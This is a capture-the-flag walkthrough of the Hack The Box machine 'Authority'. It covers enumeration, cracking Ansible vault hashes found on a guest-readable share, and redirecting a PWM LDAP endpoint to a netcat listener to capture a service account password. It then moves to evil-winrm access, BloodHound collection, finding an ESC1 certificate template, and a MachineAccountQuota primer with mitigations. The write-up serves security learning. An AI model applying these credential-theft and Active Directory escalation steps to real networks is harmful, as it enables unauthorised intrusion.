+++
tags = ["Box", "HTB", "Medium", "Windows", "LDAP", "CA", "Certificate", "Ansible", "RBCD", "MachineAccountQuota", "PKINIT", "RBCD", "ESC1"]
draft = false
title = "Authority HTB Walkthrough"
author = "bloodstiller"
date = 2024-10-31
+++

## Authority Hack The Box Walkthrough/Writeup: {#authority-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Authority>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -Pn -oA TCPbasicScan`
        ```shell
        kali in HTB/BlogEntriesMade/Authority/scans/nmap  🍣 main  3GiB/15GiB | 0B/1GiB with /usr/bin/zsh
        🕙 15:05:50 zsh ❯ nmap $box -Pn -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 15:05 BST
        Nmap scan report for 10.129.229.56
        Host is up (0.11s latency).
        Not shown: 987 closed tcp ports (reset)
        PORT     STATE SERVICE
        53/tcp   open  domain
        80/tcp   open  http
        88/tcp   open  kerberos-sec
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        389/tcp  open  ldap
        445/tcp  open  microsoft-ds
        464/tcp  open  kpasswd5
        593/tcp  open  http-rpc-epmap
        636/tcp  open  ldapssl
        3268/tcp open  globalcatLDAP
        3269/tcp open  globalcatLDAPssl
        8443/tcp open  https-alt

        Nmap done: 1 IP address (1 host up) scanned in 677.96 seconds

        ```
    -   **Initial thoughts**:
        -   DNS, HTTP, kerberos &amp; LDAP are all interesting. However what is more interesting is the HTTP &amp; `8443` https-alt.


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:

    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    kali in HTB/BlogEntriesMade/Authority/scans/nmap  🍣 main  4GiB/15GiB | 0B/1GiB with /usr/bin/zsh
    🕙 18:30:10 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 18:30 BST
    Nmap scan report for authority.htb (10.129.229.56)
    Host is up (0.035s latency).
    Not shown: 65506 closed tcp ports (reset)
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    80/tcp    open  http          Microsoft IIS httpd 10.0
    |_http-title: IIS Windows Server
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    88/tcp    open  kerberos-sec  Microsoft Windows ~Kerberos~ (server time: 2024-10-22 21:31:30Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
    | ssl-cert: Subject:
    | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
    | Not valid before: 2022-08-09T23:03:21
    |_Not valid after:  2024-08-09T23:13:21
    |_ssl-date: 2024-10-22T21:32:46+00:00; +4h00m02s from scanner time.
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
    | ssl-cert: Subject:
    | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
    | Not valid before: 2022-08-09T23:03:21
    |_Not valid after:  2024-08-09T23:13:21
    |_ssl-date: 2024-10-22T21:32:46+00:00; +4h00m03s from scanner time.
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
    |_ssl-date: 2024-10-22T21:32:46+00:00; +4h00m02s from scanner time.
    | ssl-cert: Subject:
    | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
    | Not valid before: 2022-08-09T23:03:21
    |_Not valid after:  2024-08-09T23:13:21
    3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
    | ssl-cert: Subject:
    | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
    | Not valid before: 2022-08-09T23:03:21
    |_Not valid after:  2024-08-09T23:13:21
    |_ssl-date: 2024-10-22T21:32:46+00:00; +4h00m03s from scanner time.
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    8443/tcp  open  ssl/https-alt
    | fingerprint-strings:
    |   FourOhFourRequest, GetRequest:
    |     HTTP/1.1 200
    |     Content-Type: text/html;charset=ISO-8859-1
    |     Content-Length: 82
    |     Date: Tue, 22 Oct 2024 21:31:36 GMT
    |     Connection: close
    |     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
    |   HTTPOptions:
    |     HTTP/1.1 200
    |     Allow: GET, HEAD, POST, OPTIONS
    |     Content-Length: 0
    |     Date: Tue, 22 Oct 2024 21:31:36 GMT
    |     Connection: close
    |   RTSPRequest:
    |     HTTP/1.1 400
    |     Content-Type: text/html;charset=utf-8
    |     Content-Language: en
    |     Content-Length: 1936
    |     Date: Tue, 22 Oct 2024 21:31:42 GMT
    |     Connection: close
    |     <!doctype html><html lang="en"><head><title>HTTP Status 400
    |     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body>\<h1>HTTP Status 400
    |_    Request\</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
    |_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
    | ssl-cert: Subject: commonName=172.16.2.118
    | Not valid before: 2024-10-20T17:43:21
    |_Not valid after:  2026-10-23T05:21:45
    |_ssl-date: TLS randomness does not represent time
    9389/tcp  open  mc-nmf        .NET Message Framing
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    49664/tcp open  msrpc         Microsoft Windows RPC
    49665/tcp open  msrpc         Microsoft Windows RPC
    49666/tcp open  msrpc         Microsoft Windows RPC
    49668/tcp open  msrpc         Microsoft Windows RPC
    49673/tcp open  msrpc         Microsoft Windows RPC
    49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49691/tcp open  msrpc         Microsoft Windows RPC
    49693/tcp open  msrpc         Microsoft Windows RPC
    49694/tcp open  msrpc         Microsoft Windows RPC
    49697/tcp open  msrpc         Microsoft Windows RPC
    49712/tcp open  msrpc         Microsoft Windows RPC
    61640/tcp open  msrpc         Microsoft Windows RPC
    62919/tcp open  msrpc         Microsoft Windows RPC
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=10/22%Time=6717E176%P=x86_64-pc-linu
    SF:x-gnu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/ht
    SF:ml;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Tue,\x2022\x
    SF:20Oct\x202024\x2021:31:36\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\
    SF:n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm
    SF:'\"/></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\
    SF:x20GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x
    SF:20Tue,\x2022\x20Oct\x202024\x2021:31:36\x20GMT\r\nConnection:\x20close\
    SF:r\n\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:
    SF:\x20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20T
    SF:ue,\x2022\x20Oct\x202024\x2021:31:36\x20GMT\r\nConnection:\x20close\r\n
    SF:\r\n\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"
    SF:0;URL='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x2
    SF:0\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20e
    SF:n\r\nContent-Length:\x201936\r\nDate:\x20Tue,\x2022\x20Oct\x202024\x202
    SF:1:31:42\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x
    SF:20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad
    SF:\x20Request</title><style\x20type=\"text/css\">body\x20{font-family:Tah
    SF:oma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgr
    SF:ound-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16p
    SF:x;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color
    SF::black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;
    SF:}</style></head><body>\<h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\
    SF:x20Request</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x
    SF:20Report</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x2
    SF:0the\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p>
    SF:<p><b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x
    SF:20process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20
    SF:perceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed
    SF:\x20request\x20syntax,\x20invalid\x20");
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.94SVN%E=4%D=10/22%OT=53%CT=1%CU=39948%PV=Y%DS=2%DC=I%G=Y%TM=671
    OS:7E1BC%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S
    OS:%TS=U)OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW
    OS:8NNS%O6=M53CNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(
    OS:R=Y%DF=Y%T=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS
    OS:%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W
    OS:=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
    OS:5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=
    OS:O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
    OS:=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80
    OS:%CD=Z)

    Network Distance: 2 hops
    Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled and required
    | smb2-time:
    |   date: 2024-10-22T21:32:35
    |_  start_date: N/A
    |_clock-skew: mean: 4h00m02s, deviation: 0s, median: 4h00m01s

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 135.38 seconds

    ```

### LDAP `389`: {#ldap-389}


#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapire>
    -   <https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb>
        -   `python3 ldapchecker.py $box`
            -   It will dump general information &amp; also detailed &amp; simple information including:
                -   Groups
                -   Users

-   It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in HTB/BlogEntriesMade/Authority/scans/ldap  🍣 main  3GiB/15GiB | 0B/1GiB with /usr/bin/zsh
        🕙 15:59:01 zsh ❯ python3 ~/Desktop/WindowsTools/ldapchecker.py $box
        Attempting to connect to 10.129.229.56 with SSL...
        Connected successfully. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=authority,DC=htb
            CN=Configuration,DC=authority,DC=htb
            CN=Schema,CN=Configuration,DC=authority,DC=htb
            DC=DomainDnsZones,DC=authority,DC=htb
            DC=ForestDnsZones,DC=authority,DC=htb
        ```

    2.  <span class="underline">We have the domain functionality level</span>:
        ```shell
          Other:
            domainFunctionality:
              7
            forestFunctionality:
              7
            domainControllerFunctionality:
              7
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.
            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.)
            ```shell
            serverName:
                CN=AUTHORITY,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=authority,DC=htb
            ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.

-   **I update my `/etc/hosts` file now that we have the server name**.
    -   This is so we can use tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration as well as other tools later on.


### DNS `53`: {#dns-53}

-   **Using dnsenum to enumerate DNS entries**:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain`
    -   Nothing of note, just standard entries.
    -   {{< figure src="/ox-hugo/2024-10-22-161000_.png" >}}


### kerberos `88`: {#kerberos-88}


#### Using [Kerbrute](https://github.com/ropnop/kerbrute) to bruteforce Usernames: {#using-kerbrute-to-bruteforce-usernames}

-   **As kerberos is present we can enumerate users using** [kerbrute](https://github.com/ropnop/kerbrute):
    -   `kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt`
    -   No users found:
    -   {{< figure src="/ox-hugo/2024-10-22-160705_.png" >}}


### HTTP `80`: {#http-80}

-   **Standard holding page for** `IIS`:
    -   {{< figure src="/ox-hugo/2024-10-23-070918_.png" >}}


### HTTPS-ALT `8443`: {#https-alt-8443}


#### Discovering a password manager service: {#discovering-a-password-manager-service}

-   **Looks to be hosting** `PWM`:
    -   {{< figure src="/ox-hugo/2024-10-22-173941_.png" >}}
    -   {{< figure src="/ox-hugo/2024-10-22-173917_.png" >}}

-   **Some quick searching reveals this is an open source password self service application**:
    -   <https://github.com/pwm-project/pwm>

-   **Config manager**:
    -   {{< figure src="/ox-hugo/2024-10-22-174800_.png" >}}

-   **Discovering the user** `svc_pwm`:
    -   {{< figure src="/ox-hugo/2024-10-23-073111_.png" >}}

-   Unfortunately it doesn't look like there is much else we can do here at the moment so let's continue to enumerate. However this is a good target and finding.


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   **This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
    -   Guest session we get a hit &amp; access to the `development` share.
    -   {{< figure src="/ox-hugo/2024-10-22-161924_.png" >}}
    -   I test Null connection but it does not work.


### Enumerating the development share: {#enumerating-the-development-share}

-   **I connect using** `smbclient`:
    -   `smbclient -U $domain\\guest \\\\$box\\Development`
    -   {{< figure src="/ox-hugo/2024-10-22-172227_.png" >}}

-   **There is a folder called** "`Automation`" **I use** `smbget` **to download it**:
    -   `smbget -U $domain/guest --recursive "smb://$box/Development"`
    -   {{< figure src="/ox-hugo/2024-10-22-172431_.png" >}}
    -   Looking I can see it's a folder containing, `Ansible` information.
    -   `Ansible` is an open-source automation tool used for configuration management, application deployment, and task automation across multiple systems without requiring agents. Meaning that it's possible we may find some hard-coded creds etc.


### Finding Hard-Coded Creds &amp; Hashes Ansible files: {#finding-hard-coded-creds-and-hashes-ansible-files}


#### Discovering the CA Admin Username/Email: {#discovering-the-ca-admin-username-email}

-   **Finding the CA email**:
    -   `grep -r "admin" Ansible`
    -   {{< figure src="/ox-hugo/2024-10-24-074226_.png" >}}


#### Discovering the Ansible Username: {#discovering-the-ansible-username}

-   {{< figure src="/ox-hugo/2024-10-24-074355_.png" >}}


#### Hard Coded TomCat Creds: {#hard-coded-tomcat-creds}

-   **I run grep recursivley to search for passwords**:
    -   `grep -r "pass" Ansible`
    -   Tomcat Creds:
        -   {{< figure src="/ox-hugo/2024-10-22-172915_.png" >}}
        -   There is currently no TomCat Instance I can find running, unless it's running internally. However this is a good finding.


#### Ansible Hashes: {#ansible-hashes}

-   **Ansible Vault Encoded Creds**:
    -   Looking through the files further I find ansible encoded passwords in the `/Automation/Ansible/PWM/defaults/main.yml` file
    -   This is good as it's in the subfolder `PWM` which is the Password Manager service we found on `8443` earlier.
        ![](/ox-hugo/2024-10-22-192317_.png)
    -   Some quick searching &amp; I find [this article by Ben Grewell](https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/) about cracking `ansible` hashes.


### Cracking Ansible Vault Hashes Using Ansible2John &amp; John The Ripper: {#cracking-ansible-vault-hashes-using-ansible2john-and-john-the-ripper}


#### Converting Ansible Vault Hashes to John format using `ansible2john`: {#converting-ansible-vault-hashes-to-john-format-using-ansible2john}

-   +Important+: For some reason `ansible2john` will note be able to process &amp; convert more than 1 hash per file.
-   This means each hash has to be placed in a separate file &amp; then converted. I am telling you this as I WASTED so much time trying to debug this.
    -   {{< figure src="/ox-hugo/2024-10-23-070652_.png" >}}


1.  **Place each hash in it's own file**:
2.  **Run** `ansible2john` **on each file**:
    -   `ansible2john ansible1.hashes > ansible.hashes`
    -   {{< figure src="/ox-hugo/2024-10-23-071253_.png" >}}


#### Cracking Ansible Vault Hashes Using John: {#cracking-ansible-vault-hashes-using-john}

-   **Now we have our converted hashes we can use john to attempt to crack them**:
    -   john &#x2013;wordlist=~/Wordlists/rockyou.txt ansbile.hashes
    -   {{< figure src="/ox-hugo/2024-10-23-072923_.png" >}}
    -   They crack.

-   **I try them in the** `PWM` **Page, but they are rejected**:
    -   {{< figure src="/ox-hugo/2024-10-23-073019_.png" >}}

-   +Note+: *Jumping back to [Ben's Article](https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/) we can see that we actually need to decrypt the vault passwords with the password we have just found.*


#### Using Ansible Vault to decrypt the hashes. {#using-ansible-vault-to-decrypt-the-hashes-dot}

-   **Install** `Ansible` **Package**:
    -   If you do not have `ansible` installed you will need to install it to be able to use `ansible-vault`.
    -   On `debian (kali)` install with: `sudo apt install ansible-core`

-   **Preparing our hashes**:
    -   Again ansible-vault is sassy if you have more than 1 hash in the file, so it's better to just decrypt each file:
        -   {{< figure src="/ox-hugo/2024-10-24-073224_.png" >}}

-   **Decrypting** `ansible` **hashes using** `ansible-vault`:
    -   `ansible-vault view Vault*`
    -   {{< figure src="/ox-hugo/2024-10-24-072929_.png" >}}

-   So we now have the password for the user `svc_pwm` as well as the ldap password


#### Re-cap of process ansible hash cracking process: {#re-cap-of-process-ansible-hash-cracking-process}

-   We needed to convert each of the `ansible` hashes to the crackable format using `ansible2john` and placing each hash in it's own file.
-   We then cracked those converted hashes to retrieve the vault password.
-   We can then decrypt the original hashes using the retrieved password with `ansible-vault`


### Logging into PWM: {#logging-into-pwm}

-   **I attempt to login to the main page using our new found creds but get the below error**:
    -   {{< figure src="/ox-hugo/2024-10-24-074706_.png" >}}

-   **I then login to the configuration page**:
    -   {{< figure src="/ox-hugo/2024-10-24-075702_.png" >}}

-   **I find the** `LDAP Proxy` **username**:
    -   {{< figure src="/ox-hugo/2024-10-24-075251_.png" >}}
    -   I attempt to authenticate with this user and the found passwords but it fails.
        -   {{< figure src="/ox-hugo/2024-10-24-075336_.png" >}}

-   **I click Cancel (just to see what happens)**
    -   {{< figure src="/ox-hugo/2024-10-24-075817_.png" >}}

-   **I am taken to this page where we can download the Configuration**:
    ![](/ox-hugo/2024-10-24-075956_.png)
    -   I download it

-   **Looking at the file we can see a** `configPasswordHash`:
    -   {{< figure src="/ox-hugo/2024-10-24-080403_.png" >}}
    -   I check it on <https://hashes.com>
        -   {{< figure src="/ox-hugo/2024-10-24-080559_.png" >}}

    -   **Searching hashcats website we can see it's mode** `3200`:
        -   {{< figure src="/ox-hugo/2024-10-24-080723_.png" >}}

-   **I run it through hashcat**:
    -   `hashcat -m 3200 PWMHash ~/Wordlists/rockyou.txt`
    - +Note+: Future bloodstiller here, this did not crack or lead anywhere (save yourself some time)

<!--listend-->

-   **Whilst that runs looking back on that page we can actually access the DB**:
    -   {{< figure src="/ox-hugo/2024-10-24-075913_.png" >}}
    -   **Clicking it enables us to download the DB**:
        -   {{< figure src="/ox-hugo/2024-10-24-081352_.png" >}}
        -   I download it

-   **I open it in** `sqlitebrowser`:
    -   `sqlitebrowser PWM-Local.DB`
    -   It asks for a key but none of the retrieved keys we have work:
        -   {{< figure src="/ox-hugo/2024-10-24-081709_.png" >}}


### Stealing LDAP Credentials VIA PWM: {#stealing-ldap-credentials-via-pwm}

-   Looking back in the configuration for the `PWM` service I discover we can add `ldap` endpoints. This means we can have the victim authenticate to us and steal the credentials.

-   **Have the victim connect back to us**:
    -   With `PWM` if we can access the config page we can enter our URL:
    -   {{< figure src="/ox-hugo/2024-10-24-083418_.png" >}}
    -   {{< figure src="/ox-hugo/2024-10-24-083633_.png" >}}
        -   Ensure we use `ldap` not `ldaps` or it will be encrypted and we will just cipher text.

-   **Setup Listening Server**:
    -   `nc -nvlp 636`
    -   +Note+:
        -   No special type of server needs to be used just a server and port to listen on.

-   **Initiate Connection**:
    -   {{< figure src="/ox-hugo/2024-10-24-083706_.png" >}}

-   **Capture Creds**:
    -   {{< figure src="/ox-hugo/2024-10-24-083807_.png" >}}

-   **I verify with netexec**:
    -   `netexec ldap $domain -u $user -p $pass`
    -   {{< figure src="/ox-hugo/2024-10-24-084823_.png" >}}


## 2. Foothold: {#2-dot-foothold}


### Re-running ldapire now that we have creds to enumerate users and groups: {#re-running-ldapire-now-that-we-have-creds-to-enumerate-users-and-groups}

-   **As we have credentials I re-run my** `ldap` **enumeration tool**: [ldapire](https://github.com/bloodstiller/ldapire/tree/main)
    -   `python3 ~/Desktop/WindowsTools/ldapire.py $box -u $user -p $pass`
    -   {{< figure src="/ox-hugo/2024-10-24-084920_.png" >}}
    -   I check the description fields for users &amp; groups as well as the entries but there is nothing of note:
    -   We do have a nice list of groups and users now:
    -   {{< figure src="/ox-hugo/2024-10-24-090256_.png" >}}


### Connecting via evil-winrm as `svc_ldap`: {#connecting-via-evil-winrm-as-svc-ldap}

-   `evil-winrm -i $box -u $user -p $pass`
-   {{< figure src="/ox-hugo/2024-10-24-090430_.png" >}}

-   **Get our user flag**:
    -   {{< figure src="/ox-hugo/2024-10-24-090746_.png" >}}


### Doing a bloodhound capture using SharpHound: {#doing-a-bloodhound-capture-using-sharphound}

-   **I upload** `SharpHound.exe` **using** `evil-winrm`:

-   **Then run a capture**:
    -   `.\SharpHound.exe all`
    -   {{< figure src="/ox-hugo/2024-10-24-103424_.png" >}}

-   **I download the zip**:
    -   `download 20241024093228_BloodHound.zip`


### Reading the bloodhound results: {#reading-the-bloodhound-results}

-   **We can see we have the ability to enroll in all of these certificates**.
    -   {{< figure src="/ox-hugo/2024-10-24-104113_.png" >}}


### Enumerating the Certificate Authority with certipy-ad (CA): {#enumerating-the-certificate-authority-with-certipy-ad--ca}

-   As we saw CA information earlier in the Automation share and we have the ability to enroll using certain certificates, I use `certipy-ad` to enumerate if there are any vulnerable certificates.
    -   `certipy-ad find -vulnerable -enabled -u $user@$domain -p $pass -dc-ip $box -debug`
    -   {{< figure src="/ox-hugo/2024-10-24-094057_.png" >}}

-   **Reading the results we can see that there is a vulnerable certificate: &amp; we can use the** `ESC1` **attack chain**:
    -   {{< figure src="/ox-hugo/2024-10-24-094435_.png" >}}

-   **Looking at who can enroll the cert we see it is all groups**:
    -   {{< figure src="/ox-hugo/2024-10-24-100504_.png" >}}
    -   This unfortunately was not listed as any of the certs we could enroll in as our current user. However it does say "`Domain Computers`" can so if we can create a computer &amp; add it to the domain we should be able to use that with the ESC1 attack.


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Enumerating MachineAccountQuota using netexec: {#enumerating-machineaccountquota-using-netexec}

-   By default, all users can add up to 10 computers to a domain. (You read that right. This is called the `MachineAccountQuota` or MAQ).
-   This  setting can present a significant security risk in Active Directory environments if left unchecked.


#### MachineAccountQuota Primer: {#machineaccountquota-primer}

1.  **Default Behavior**:
    -   **Purpose**: Limits the number of machine accounts (computers) a non-administrative user can join to a domain.
    -   **Value**: The `MachineAccountQuota` has been set to 10 by default since Windows 2000
    -   +Any authenticated domain user can leverage this quota+:
        -   No special permissions are required beyond basic domain user rights
        -   Default Value: By default, users in the "Authenticated Users" group can create 10 computer accounts in Active Directory.
    -   **Location**: Managed via Active Directory settings and group policies.

2.  **Security Implications**:

    -   Attackers can potentially add rogue machines to a domain, which may be used for privilege escalation or lateral movement.
        -   Think Resource Based Constrained Delegation attacks:

    <!--listend-->

    -   Each computer account could potentially be used for lateral movement or persistence.
    -   Rogue computer accounts can be leveraged for relay attacks or resource access

3.  **Mitigation Strategies**:
    -   Reduce the MAQ value to 0 for enhanced security
    -   Implement a formal process for adding computers to the domain
    -   Monitor computer account creation events ([Event ID 4741](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4741))
    -   Regularly audit computer accounts for suspicious entries
    -   How to Modify MAQ using AD cmdlet:
        -   `Set-ADDomain -Identity yourdomain.com -Replace @{"ms-DS-MachineAccountQuota"="0"}`


#### How to enumerate MAQ value: {#how-to-enumerate-maq-value}

-   **Using** `ldap`:
    -   `dsquery * "DC=domain,DC=com" -scope base -attr ms-DS-MachineAccountQuota`
